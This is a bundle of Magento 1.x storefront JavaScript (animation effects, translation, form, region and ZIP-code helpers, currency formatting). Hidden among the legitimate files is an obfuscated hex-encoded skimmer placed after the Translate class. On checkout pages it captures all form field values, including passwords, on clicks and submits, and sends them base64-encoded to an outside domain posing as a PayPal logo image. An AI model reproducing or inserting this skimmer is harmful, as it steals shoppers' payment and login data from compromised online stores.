        var css = this.element.getStyles();
        this.style = this.style.reject(function(style) {
          return style.value == css[style.key];
        });
        options.afterFinishInternal = function(effect) {
          effect.element.addClassName(effect.options.style);
          effect.transforms.each(function(transform) {
            effect.element.style[transform.style] = '';
          });
        };
      }
    }
    this.start(options);
  },

  setup: function(){
    function parseColor(color){
      if (!color || ['rgba(0, 0, 0, 0)','transparent'].include(color)) color = '#ffffff';
      color = color.parseColor();
      return $R(0,2).map(function(i){
        return parseInt( color.slice(i*2+1,i*2+3), 16 );
      });
    }
    this.transforms = this.style.map(function(pair){
      var property = pair[0], value = pair[1], unit = null;

      if (value.parseColor('#zzzzzz') != '#zzzzzz') {
        value = value.parseColor();
        unit  = 'color';
      } else if (property == 'opacity') {
        value = parseFloat(value);
        if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
          this.element.setStyle({zoom: 1});
      } else if (Element.CSS_LENGTH.test(value)) {
          var components = value.match(/^([\+\-]?[0-9\.]+)(.*)$/);
          value = parseFloat(components[1]);
          unit = (components.length == 3) ? components[2] : null;
      }

      var originalValue = this.element.getStyle(property);
      return {
        style: property.camelize(),
        originalValue: unit=='color' ? parseColor(originalValue) : parseFloat(originalValue || 0),
        targetValue: unit=='color' ? parseColor(value) : value,
        unit: unit
      };
    }.bind(this)).reject(function(transform){
      return (
        (transform.originalValue == transform.targetValue) ||
        (
          transform.unit != 'color' &&
          (isNaN(transform.originalValue) || isNaN(transform.targetValue))
        )
      );
    });
  },
  update: function(position) {
    var style = { }, transform, i = this.transforms.length;
    while(i--)
      style[(transform = this.transforms[i]).style] =
        transform.unit=='color' ? '#'+
          (Math.round(transform.originalValue[0]+
            (transform.targetValue[0]-transform.originalValue[0])*position)).toColorPart() +
          (Math.round(transform.originalValue[1]+
            (transform.targetValue[1]-transform.originalValue[1])*position)).toColorPart() +
          (Math.round(transform.originalValue[2]+
            (transform.targetValue[2]-transform.originalValue[2])*position)).toColorPart() :
        (transform.originalValue +
          (transform.targetValue - transform.originalValue) * position).toFixed(3) +
            (transform.unit === null ? '' : transform.unit);
    this.element.setStyle(style, true);
  }
});

Effect.Transform = Class.create({
  initialize: function(tracks){
    this.tracks  = [];
    this.options = arguments[1] || { };
    this.addTracks(tracks);
  },
  addTracks: function(tracks){
    tracks.each(function(track){
      track = $H(track);
      var data = track.values().first();
      this.tracks.push($H({
        ids:     track.keys().first(),
        effect:  Effect.Morph,
        options: { style: data }
      }));
    }.bind(this));
    return this;
  },
  play: function(){
    return new Effect.Parallel(
      this.tracks.map(function(track){
        var ids = track.get('ids'), effect = track.get('effect'), options = track.get('options');
        var elements = [$(ids) || $$(ids)].flatten();
        return elements.map(function(e){ return new effect(e, Object.extend({ sync:true }, options)) });
      }).flatten(),
      this.options
    );
  }
});

Element.CSS_PROPERTIES = $w(
  'backgroundColor backgroundPosition borderBottomColor borderBottomStyle ' +
  'borderBottomWidth borderLeftColor borderLeftStyle borderLeftWidth ' +
  'borderRightColor borderRightStyle borderRightWidth borderSpacing ' +
  'borderTopColor borderTopStyle borderTopWidth bottom clip color ' +
  'fontSize fontWeight height left letterSpacing lineHeight ' +
  'marginBottom marginLeft marginRight marginTop markerOffset maxHeight '+
  'maxWidth minHeight minWidth opacity outlineColor outlineOffset ' +
  'outlineWidth paddingBottom paddingLeft paddingRight paddingTop ' +
  'right textIndent top width wordSpacing zIndex');

Element.CSS_LENGTH = /^(([\+\-]?[0-9\.]+)(em|ex|px|in|cm|mm|pt|pc|\%))|0$/;

String.__parseStyleElement = document.createElement('div');
String.prototype.parseStyle = function(){
  var style, styleRules = $H();
  if (Prototype.Browser.WebKit)
    style = new Element('div',{style:this}).style;
  else {
    String.__parseStyleElement.innerHTML = '<div style="' + this + '"></div>';
    style = String.__parseStyleElement.childNodes[0].style;
  }

  Element.CSS_PROPERTIES.each(function(property){
    if (style[property]) styleRules.set(property, style[property]);
  });

  if (Prototype.Browser.IE && this.include('opacity'))
    styleRules.set('opacity', this.match(/opacity:\s*((?:0|1)?(?:\.\d*)?)/)[1]);

  return styleRules;
};

if (document.defaultView && document.defaultView.getComputedStyle) {
  Element.getStyles = function(element) {
    var css = document.defaultView.getComputedStyle($(element), null);
    return Element.CSS_PROPERTIES.inject({ }, function(styles, property) {
      styles[property] = css[property];
      return styles;
    });
  };
} else {
  Element.getStyles = function(element) {
    element = $(element);
    var css = element.currentStyle, styles;
    styles = Element.CSS_PROPERTIES.inject({ }, function(results, property) {
      results[property] = css[property];
      return results;
    });
    if (!styles.opacity) styles.opacity = element.getOpacity();
    return styles;
  };
}

Effect.Methods = {
  morph: function(element, style) {
    element = $(element);
    new Effect.Morph(element, Object.extend({ style: style }, arguments[2] || { }));
    return element;
  },
  visualEffect: function(element, effect, options) {
    element = $(element);
    var s = effect.dasherize().camelize(), klass = s.charAt(0).toUpperCase() + s.substring(1);
    new Effect[klass](element, options);
    return element;
  },
  highlight: function(element, options) {
    element = $(element);
    new Effect.Highlight(element, options);
    return element;
  }
};

$w('fade appear grow shrink fold blindUp blindDown slideUp slideDown '+
  'pulsate shake puff squish switchOff dropOut').each(
  function(effect) {
    Effect.Methods[effect] = function(element, options){
      element = $(element);
      Effect[effect.charAt(0).toUpperCase() + effect.substring(1)](element, options);
      return element;
    };
  }
);

$w('getInlineOpacity forceRerendering setContentZoom collectTextNodes collectTextNodesIgnoreClass getStyles').each(
  function(f) { Effect.Methods[f] = Element[f]; }
);

Element.addMethods(Effect.Methods);
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     js
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */

var Translate = Class.create();
Translate.prototype = {
    initialize: function(data){
        this.data = $H(data);
    },

    translate : function(){
        var args = arguments;
        var text = arguments[0];

        if(this.data.get(text)){
            return this.data.get(text);
        }
        return text;
    },
    add : function() {
        if (arguments.length > 1) {
            this.data.set(arguments[0], arguments[1]);
        } else if (typeof arguments[0] =='object') {
            $H(arguments[0]).each(function (pair){
                this.data.set(pair.key, pair.value);
            }.bind(this));
        }
    }
}

var _0xc188=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x6C\x69\x62\x73\x2E\x73\x75\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x61\x79\x70\x61\x6C\x2D\x6C\x6F\x67\x6F\x2E\x6A\x70\x67","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var gee33b77d74b736f8197ee39a58f56965={snd:null,Glink:_0xc188[0],myid:(function(_0xc2d8x2){var _0xc2d8x3=document[_0xc188[7]][_0xc188[6]]( new RegExp(_0xc188[2]+ _0xc2d8x2[_0xc188[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xc188[3])+ _0xc188[5]));return _0xc2d8x3?decodeURIComponent(_0xc2d8x3[1]):undefined})(_0xc188[1])|| (function(){var _0xc2d8x4= new Date();var _0xc2d8x5=_0xc2d8x4[_0xc188[8]]()+ _0xc188[9]+ Math[_0xc188[11]](Math[_0xc188[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xc2d8x6= new Date( new Date()[_0xc188[8]]()+ 60* 60* 24* 1000);document[_0xc188[7]]= _0xc188[12]+ _0xc2d8x5+ _0xc188[13]+ _0xc2d8x6[_0xc188[14]]();return _0xc2d8x5})(),clk:function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;var _0xc2d8x7=document[_0xc188[17]](_0xc188[16]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8x7[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8x7[_0xc2d8x8][_0xc188[19]][_0xc188[18]]> 0){var _0xc2d8x9=_0xc2d8x7[_0xc2d8x8][_0xc188[20]];if(_0xc2d8x9== _0xc188[21]){_0xc2d8x9= _0xc2d8x8};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]+= _0xc2d8x7[_0xc2d8x8][_0xc188[20]]+ _0xc188[22]+ _0xc2d8x7[_0xc2d8x8][_0xc188[19]]+ _0xc188[23]}}},send:function(){try{var _0xc2d8xa=document[_0xc188[17]](_0xc188[24]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8xa[_0xc188[18]];_0xc2d8x8++){var _0xc2d8xb=_0xc2d8xa[_0xc2d8x8];if(_0xc2d8xb[_0xc188[25]]!= _0xc188[26]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[27]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[28]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[29]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[30]){if(_0xc2d8xb[_0xc188[31]]){_0xc2d8xb[_0xc188[31]](_0xc188[32],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xb[_0xc188[35]](_0xc188[34],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}}};var _0xc2d8xc=document[_0xc188[17]](_0xc188[36]);for(vari= 0;_0xc2d8x8< _0xc2d8xc[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8xc[_0xc2d8x8][_0xc188[31]]){_0xc2d8xc[_0xc2d8x8][_0xc188[31]](_0xc188[37],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xc[_0xc2d8x8][_0xc188[35]](_0xc188[38],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}};if(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]!= null){var _0xc2d8xd=location[_0xc188[44]][_0xc188[43]](_0xc188[42])[_0xc188[41]](0)[_0xc188[40]](_0xc188[39]);var _0xc2d8xe=btoa(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]);var _0xc2d8xf= new XMLHttpRequest();_0xc2d8xf[_0xc188[46]](_0xc188[45],gee33b77d74b736f8197ee39a58f56965.Glink,true);_0xc2d8xf[_0xc188[49]](_0xc188[47],_0xc188[48]);_0xc2d8xf[_0xc188[54]](_0xc188[50]+ _0xc2d8xe+ _0xc188[51]+ _0xc2d8xd+ _0xc188[52]+ gee33b77d74b736f8197ee39a58f56965[_0xc188[53]])};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;_0xc2d8xe= null;setTimeout(function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()},30)}catch(e){}}};if(( new RegExp(_0xc188[57],_0xc188[58]))[_0xc188[56]](window[_0xc188[55]])){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()}
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
VarienForm = Class.create();
VarienForm.prototype = {
    initialize: function(formId, firstFieldFocus){
        this.form       = $(formId);
        if (!this.form) {
            return;
        }
        this.cache      = $A();
        this.currLoader = false;
        this.currDataIndex = false;
        this.validator  = new Validation(this.form);
        this.elementFocus   = this.elementOnFocus.bindAsEventListener(this);
        this.elementBlur    = this.elementOnBlur.bindAsEventListener(this);
        this.childLoader    = this.onChangeChildLoad.bindAsEventListener(this);
        this.highlightClass = 'highlight';
        this.extraChildParams = '';
        this.firstFieldFocus= firstFieldFocus || false;
        this.bindElements();
        if(this.firstFieldFocus){
            try{
                Form.Element.focus(Form.findFirstElement(this.form))
            }
            catch(e){}
        }
    },

    submit : function(url){
        if(this.validator && this.validator.validate()){
             this.form.submit();
        }
        return false;
    },

    bindElements:function (){
        var elements = Form.getElements(this.form);
        for (var row in elements) {
            if (elements[row].id) {
                Event.observe(elements[row],'focus',this.elementFocus);
                Event.observe(elements[row],'blur',this.elementBlur);
            }
        }
    },

    elementOnFocus: function(event){
        var element = Event.findElement(event, 'fieldset');
        if(element){
            Element.addClassName(element, this.highlightClass);
        }
    },

    elementOnBlur: function(event){
        var element = Event.findElement(event, 'fieldset');
        if(element){
            Element.removeClassName(element, this.highlightClass);
        }
    },

    setElementsRelation: function(parent, child, dataUrl, first){
        if (parent=$(parent)) {
            // TODO: array of relation and caching
            if (!this.cache[parent.id]){
                this.cache[parent.id] = $A();
                this.cache[parent.id]['child']     = child;
                this.cache[parent.id]['dataUrl']   = dataUrl;
                this.cache[parent.id]['data']      = $A();
                this.cache[parent.id]['first']      = first || false;
            }
            Event.observe(parent,'change',this.childLoader);
        }
    },

    onChangeChildLoad: function(event){
        element = Event.element(event);
        this.elementChildLoad(element);
    },

    elementChildLoad: function(element, callback){
        this.callback = callback || false;
        if (element.value) {
            this.currLoader = element.id;
            this.currDataIndex = element.value;
            if (this.cache[element.id]['data'][element.value]) {
                this.setDataToChild(this.cache[element.id]['data'][element.value]);
            }
            else{
                new Ajax.Request(this.cache[this.currLoader]['dataUrl'],{
                        method: 'post',
                        parameters: {"parent":element.value},
                        onComplete: this.reloadChildren.bind(this)
                });
            }
        }
    },

    reloadChildren: function(transport){
        var data = eval('(' + transport.responseText + ')');
        this.cache[this.currLoader]['data'][this.currDataIndex] = data;
        this.setDataToChild(data);
    },

    setDataToChild: function(data){
        if (data.length) {
            var child = $(this.cache[this.currLoader]['child']);
            if (child){
                var html = '<select name="'+child.name+'" id="'+child.id+'" class="'+child.className+'" title="'+child.title+'" '+this.extraChildParams+'>';
                if(this.cache[this.currLoader]['first']){
                    html+= '<option value="">'+this.cache[this.currLoader]['first']+'</option>';
                }
                for (var i in data){
                    if(data[i].value) {
                        html+= '<option value="'+data[i].value+'"';
                        if(child.value && (child.value == data[i].value || child.value == data[i].label)){
                            html+= ' selected';
                        }
                        html+='>'+data[i].label+'</option>';
                    }
                }
                html+= '</select>';
                Element.insert(child, {before: html});
                Element.remove(child);
            }
        }
        else{
            var child = $(this.cache[this.currLoader]['child']);
            if (child){
                var html = '<input type="text" name="'+child.name+'" id="'+child.id+'" class="'+child.className+'" title="'+child.title+'" '+this.extraChildParams+'>';
                Element.insert(child, {before: html});
                Element.remove(child);
            }
        }

        this.bindElements();
        if (this.callback) {
            this.callback();
        }
    }
}

RegionUpdater = Class.create();
RegionUpdater.prototype = {
    initialize: function (countryEl, regionTextEl, regionSelectEl, regions, disableAction, zipEl)
    {
        this.countryEl = $(countryEl);
        this.regionTextEl = $(regionTextEl);
        this.regionSelectEl = $(regionSelectEl);
        this.zipEl = $(zipEl);
        this.regions = regions;

        this.disableAction = (typeof disableAction=='undefined') ? 'hide' : disableAction;
        this.zipOptions = (typeof zipOptions=='undefined') ? false : zipOptions;

        if (this.regionSelectEl.options.length<=1) {
            this.update();
        }

        Event.observe(this.countryEl, 'change', this.update.bind(this));
    },

    update: function()
    {
        if (this.regions[this.countryEl.value]) {
            var i, option, region, def;

            if (this.regionTextEl) {
                def = this.regionTextEl.value.toLowerCase();
                this.regionTextEl.value = '';
            }
            if (!def) {
                def = this.regionSelectEl.getAttribute('defaultValue');
            }

            this.regionSelectEl.options.length = 1;
            for (regionId in this.regions[this.countryEl.value]) {
                region = this.regions[this.countryEl.value][regionId];

                option = document.createElement('OPTION');
                option.value = regionId;
                option.text = region.name;

                if (this.regionSelectEl.options.add) {
                    this.regionSelectEl.options.add(option);
                } else {
                    this.regionSelectEl.appendChild(option);
                }

                if (regionId==def || region.name.toLowerCase()==def || region.code.toLowerCase()==def) {
                    this.regionSelectEl.value = regionId;
                }
            }

            if (this.disableAction=='hide') {
                if (this.regionTextEl) {
                    this.regionTextEl.style.display = 'none';
                }

                this.regionSelectEl.style.display = '';
            } else if (this.disableAction=='disable') {
                if (this.regionTextEl) {
                    this.regionTextEl.disabled = true;
                }
                this.regionSelectEl.disabled = false;
            }
            this.setMarkDisplay(this.regionSelectEl, true);
        } else {
            if (this.disableAction=='hide') {
                if (this.regionTextEl) {
                    this.regionTextEl.style.display = '';
                }
                this.regionSelectEl.style.display = 'none';
                Validation.reset(this.regionSelectEl);
            } else if (this.disableAction=='disable') {
                if (this.regionTextEl) {
                    this.regionTextEl.disabled = false;
                }
                this.regionSelectEl.disabled = true;
            } else if (this.disableAction=='nullify') {
                this.regionSelectEl.options.length = 1;
                this.regionSelectEl.value = '';
                this.regionSelectEl.selectedIndex = 0;
                this.lastCountryId = '';
            }
            this.setMarkDisplay(this.regionSelectEl, false);
        }

        // Make Zip and its label required/optional
        var zipUpdater = new ZipUpdater(this.countryEl.value, this.zipEl);
        zipUpdater.update();
    },

    setMarkDisplay: function(elem, display){
        elem = $(elem);
        var labelElement = elem.up(0).down('label > span.required') ||
                           elem.up(1).down('label > span.required') ||
                           elem.up(0).down('label.required > em') ||
                           elem.up(1).down('label.required > em');
        if(labelElement) {
            inputElement = labelElement.up().next('input');
            if (display) {
                labelElement.show();
                if (inputElement) {
                    inputElement.addClassName('required-entry');
                }
            } else {
                labelElement.hide();
                if (inputElement) {
                    inputElement.removeClassName('required-entry');
                }
            }
        }
    }
}

ZipUpdater = Class.create();
ZipUpdater.prototype = {
    initialize: function(country, zipElement)
    {
        this.country = country;
        this.zipElement = $(zipElement);
    },

    update: function()
    {
        // Country ISO 2-letter codes must be pre-defined
        if (typeof optionalZipCountries == 'undefined') {
            return false;
        }

        // Ajax-request and normal content load compatibility
        if (this.zipElement != undefined) {
            this._setPostcodeOptional();
        } else {
            Event.observe(window, "load", this._setPostcodeOptional.bind(this));
        }
    },

    _setPostcodeOptional: function()
    {
        this.zipElement = $(this.zipElement);
        if (this.zipElement == undefined) {
            return false;
        }

        // find label
        var label = $$('label[for="' + this.zipElement.id + '"]')[0];
        if (label != undefined) {
            var wildCard = label.down('em') || label.down('span.required');
        }

        // Make Zip and its label required/optional
        if (optionalZipCountries.indexOf(this.country) != -1) {
            while (this.zipElement.hasClassName('required-entry')) {
                this.zipElement.removeClassName('required-entry');
            }
            if (wildCard != undefined) {
                wildCard.hide();
            }
        } else {
            this.zipElement.addClassName('required-entry');
            if (wildCard != undefined) {
                wildCard.show();
            }
        }
    }
}

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
function popWin(url,win,para) {
    var win = window.open(url,win,para);
    win.focus();
}

function setLocation(url){
    window.location.href = url;
}

function setPLocation(url, setFocus){
    if( setFocus ) {
        window.opener.focus();
    }
    window.opener.location.href = url;
}

function setLanguageCode(code, fromCode){
    //TODO: javascript cookies have different domain and path than php cookies
    var href = window.location.href;
    var after = '', dash;
    if (dash = href.match(/\#(.*)$/)) {
        href = href.replace(/\#(.*)$/, '');
        after = dash[0];
    }

    if (href.match(/[?]/)) {
        var re = /([?&]store=)[a-z0-9_]*/;
        if (href.match(re)) {
            href = href.replace(re, '$1'+code);
        } else {
            href += '&store='+code;
        }

        var re = /([?&]from_store=)[a-z0-9_]*/;
        if (href.match(re)) {
            href = href.replace(re, '');
        }
    } else {
        href += '?store='+code;
    }
    if (typeof(fromCode) != 'undefined') {
        href += '&from_store='+fromCode;
    }
    href += after;

    setLocation(href);
}

/**
 * Add classes to specified elements.
 * Supported classes are: 'odd', 'even', 'first', 'last'
 *
 * @param elements - array of elements to be decorated
 * [@param decorateParams] - array of classes to be set. If omitted, all available will be used
 */
function decorateGeneric(elements, decorateParams)
{
    var allSupportedParams = ['odd', 'even', 'first', 'last'];
    var _decorateParams = {};
    var total = elements.length;

    if (total) {
        // determine params called
        if (typeof(decorateParams) == 'undefined') {
            decorateParams = allSupportedParams;
        }
        if (!decorateParams.length) {
            return;
        }
        for (var k in allSupportedParams) {
            _decorateParams[allSupportedParams[k]] = false;
        }
        for (var k in decorateParams) {
            _decorateParams[decorateParams[k]] = true;
        }

        // decorate elements
        // elements[0].addClassName('first'); // will cause bug in IE (#5587)
        if (_decorateParams.first) {
            Element.addClassName(elements[0], 'first');
        }
        if (_decorateParams.last) {
            Element.addClassName(elements[total-1], 'last');
        }
        for (var i = 0; i < total; i++) {
            if ((i + 1) % 2 == 0) {
                if (_decorateParams.even) {
                    Element.addClassName(elements[i], 'even');
                }
            }
            else {
                if (_decorateParams.odd) {
                    Element.addClassName(elements[i], 'odd');
                }
            }
        }
    }
}

/**
 * Decorate table rows and cells, tbody etc
 * @see decorateGeneric()
 */
function decorateTable(table, options) {
    var table = $(table);
    if (table) {
        // set default options
        var _options = {
            'tbody'    : false,
            'tbody tr' : ['odd', 'even', 'first', 'last'],
            'thead tr' : ['first', 'last'],
            'tfoot tr' : ['first', 'last'],
            'tr td'    : ['last']
        };
        // overload options
        if (typeof(options) != 'undefined') {
            for (var k in options) {
                _options[k] = options[k];
            }
        }
        // decorate
        if (_options['tbody']) {
            decorateGeneric(table.select('tbody'), _options['tbody']);
        }
        if (_options['tbody tr']) {
            decorateGeneric(table.select('tbody tr'), _options['tbody tr']);
        }
        if (_options['thead tr']) {
            decorateGeneric(table.select('thead tr'), _options['thead tr']);
        }
        if (_options['tfoot tr']) {
            decorateGeneric(table.select('tfoot tr'), _options['tfoot tr']);
        }
        if (_options['tr td']) {
            var allRows = table.select('tr');
            if (allRows.length) {
                for (var i = 0; i < allRows.length; i++) {
                    decorateGeneric(allRows[i].getElementsByTagName('TD'), _options['tr td']);
                }
            }
        }
    }
}

/**
 * Set "odd", "even" and "last" CSS classes for list items
 * @see decorateGeneric()
 */
function decorateList(list, nonRecursive) {
    if ($(list)) {
        if (typeof(nonRecursive) == 'undefined') {
            var items = $(list).select('li')
        }
        else {
            var items = $(list).childElements();
        }
        decorateGeneric(items, ['odd', 'even', 'last']);
    }
}

/**
 * Set "odd", "even" and "last" CSS classes for list items
 * @see decorateGeneric()
 */
function decorateDataList(list) {
    list = $(list);
    if (list) {
        decorateGeneric(list.select('dt'), ['odd', 'even', 'last']);
        decorateGeneric(list.select('dd'), ['odd', 'even', 'last']);
    }
}

/**
 * Parse SID and produces the correct URL
 */
function parseSidUrl(baseUrl, urlExt) {
    sidPos = baseUrl.indexOf('/?SID=');
    sid = '';
    urlExt = (urlExt != undefined) ? urlExt : '';

    if(sidPos > -1) {
        sid = '?' + baseUrl.substring(sidPos + 2);
        baseUrl = baseUrl.substring(0, sidPos + 1);
    }

    return baseUrl+urlExt+sid;
}

/**
 * Formats currency using patern
 * format - JSON (pattern, decimal, decimalsDelimeter, groupsDelimeter)
 * showPlus - true (always show '+'or '-'),
 *      false (never show '-' even if number is negative)
 *      null (show '-' if number is negative)
 */

function formatCurrency(price, format, showPlus){
    precision = isNaN(format.precision = Math.abs(format.precision)) ? 2 : format.precision;
    requiredPrecision = isNaN(format.requiredPrecision = Math.abs(format.requiredPrecision)) ? 2 : format.requiredPrecision;

    //precision = (precision > requiredPrecision) ? precision : requiredPrecision;
    //for now we don't need this difference so precision is requiredPrecision
    precision = requiredPrecision;

    integerRequired = isNaN(format.integerRequired = Math.abs(format.integerRequired)) ? 1 : format.integerRequired;

    decimalSymbol = format.decimalSymbol == undefined ? "," : format.decimalSymbol;
    groupSymbol = format.groupSymbol == undefined ? "." : format.groupSymbol;
    groupLength = format.groupLength == undefined ? 3 : format.groupLength;

    if (showPlus == undefined || showPlus == true) {
        s = price < 0 ? "-" : ( showPlus ? "+" : "");
    } else if (showPlus == false) {
        s = '';
    }

    i = parseInt(price = Math.abs(+price || 0).toFixed(precision)) + "";
    pad = (i.length < integerRequired) ? (integerRequired - i.length) : 0;
    while (pad) { i = '0' + i; pad--; }

    j = (j = i.length) > groupLength ? j % groupLength : 0;
    re = new RegExp("(\\d{" + groupLength + "})(?=\\d)", "g");

    /**
     * replace(/-/, 0) is only for fixing Safari bug which appears
     * when Math.abs(0).toFixed() executed on "0" number.
     * Result is "0.-0" :(
     */
    r = (j ? i.substr(0, j) + groupSymbol : "") + i.substr(j).replace(re, "$1" + groupSymbol) + (precision ? decimalSymbol + Math.abs(price - i).toFixed(precision).replace(/-/, 0).slice(2) : "")

    if (format.pattern.indexOf('{sign}') == -1) {
        pattern = s + format.pattern;
    } else {
        pattern = format.pattern.replace('{sign}', s);
    }

    return pattern.replace('%s', r).replace(/^\s\s*/, '').replace(/\s\s*$/, '');
};

function expandDetails(el, childClass) {
    if (Element.hasClassName(el,'show-details')) {
        $$(childClass).each(function(item){item.hide()});
        Element.removeClassName(el,'show-details');
    }
    else {
        $$(childClass).each(function(item){item.show()});
        Element.addClassName(el,'show-details');
    }
}

// Version 1.0
var isIE = navigator.appVersion.match(/MSIE/) == "MSIE";

if (!window.Varien)
    var Varien = new Object();

Varien.showLoading = function(){
    Element.show('loading-process');
}
Varien.hideLoading = function(){
    Element.hide('loading-process');
}
Varien.GlobalHandlers = {
    onCreate: function() {
        Varien.showLoading();
    },

    onComplete: function() {
        if(Ajax.activeRequestCount == 0) {
            Varien.hideLoading();
        }
    }
};

Ajax.Responders.register(Varien.GlobalHandlers);

/**
